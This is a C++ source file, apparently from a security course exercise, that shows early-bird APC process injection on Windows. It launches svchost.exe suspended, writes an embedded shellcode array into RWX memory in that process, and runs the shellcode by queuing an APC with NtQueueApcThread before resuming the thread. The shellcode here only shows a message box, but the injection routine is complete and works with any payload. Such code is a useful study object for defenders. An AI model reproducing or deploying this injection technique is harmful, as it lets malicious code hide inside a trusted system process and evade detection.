#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <tchar.h>
#include <psapi.h>

using namespace std;

// This is the malicious code to be injected in the legitimate process.
// This shellcode just pops up an error window displaying "Hi INFO0045"
unsigned char shellcode[] =
"\x31\xD2\xB2\x30\x64\x8B\x12\x8B\x52\x0C\x8B\x52\x1C\x8B\x42\x08\x8B\x72\x20\x8B"
"\x12\x80\x7E\x0C\x33\x75\xF2\x89\xC7\x03\x78\x3C\x8B\x57\x78\x01\xC2\x8B\x7A\x20"
"\x01\xC7\x31\xED\x8B\x34\xAF\x01\xC6\x45\x81\x3E\x46\x61\x74\x61\x75\xF2\x81\x7E"
"\x08\x45\x78\x69\x74\x75\xE9\x8B\x7A\x24\x01\xC7\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01"
"\xC7\x8B\x7C\xAF\xFC\x01\xC7\x68\x30\x34\x35\x01\x68\x4e\x46\x4f\x30\x68\x48\x69"
"\x20\x49\x89\xE1\xFE\x49\x0B\x31\xC0\x51\x50\xFF\xD7";


// Some dynamic DLL linking to access some API calls
NTSTATUS(NTAPI *NtQueueApcThread)
(_In_ HANDLE ThreadHandle, _In_ PVOID ApcRoutine,
	_In_ PVOID ApcRoutineContext OPTIONAL, _In_ PVOID ApcStatusBlock OPTIONAL,
	_In_ ULONG ApcReserved OPTIONAL);

BOOL LoadNtdllFunctions() {
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (hNtdll == NULL)
		return FALSE;

	NtQueueApcThread =
		(NTSTATUS(NTAPI *)(HANDLE, PVOID, PVOID, PVOID, ULONG))GetProcAddress(
			hNtdll, "NtQueueApcThread");
	if (NtQueueApcThread == NULL)
		return FALSE;
}

void main()
{
	if (LoadNtdllFunctions() == FALSE) {
		cout << "Failed to load NTDLL functions.\n" << endl;
		return;
	}

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Start the child (legitimate) process svchost.exe
	if (!CreateProcess(L"C:\\Windows\\System32\\svchost.exe",   // Path to executable to call in the process
		NULL,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		CREATE_SUSPENDED,  // We want the created to be suspended
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		cout << "CreateProcess failed (" << GetLastError() << ")." << endl;
		return;
	}

	// Allocate some memory inside the child process
	LPVOID baseAddress = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (baseAddress == NULL) {
		cout << "Cannot allocate in created process" << endl;
		return;
	}

	// Write the shellcode inside the allocated memory of the child process
	if (!WriteProcessMemory(pi.hProcess, baseAddress, shellcode, sizeof(shellcode), NULL)) {
		cout << "Cannot write into child process memory" << endl;
		return;
	}

	// Queue an Asynchronous Procedure Call (APC) to the child process main thread thread.
	// This APC goes directly to the injected Shellcode
	if (NtQueueApcThread(pi.hThread, baseAddress, 0, 0, 0)) {
		cout << "Cannot queue APC to main thread" << endl;
	}

	// Resume the main thread :
	// ------------------------
	// This will check if there are APC queued. If there are, these APCs will 
	// be executed before the main thread of the child process actually resumes.
	if (ResumeThread(pi.hThread) == -1) {
		cout << "Cannot resume the main thread of the child process" << endl;
		return;
	}

	// This prints the pid of the created svchost process. You can check that it is
	// indeed created by typing the command "tasklist" in the cmd and searching
	// for the corresponding pid (or type : tasklist /fi "pid eq x" where x is the pid
	// of the 
	cout << "Process id of svchost.exe is : "<< pi.dwProcessId << endl;

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}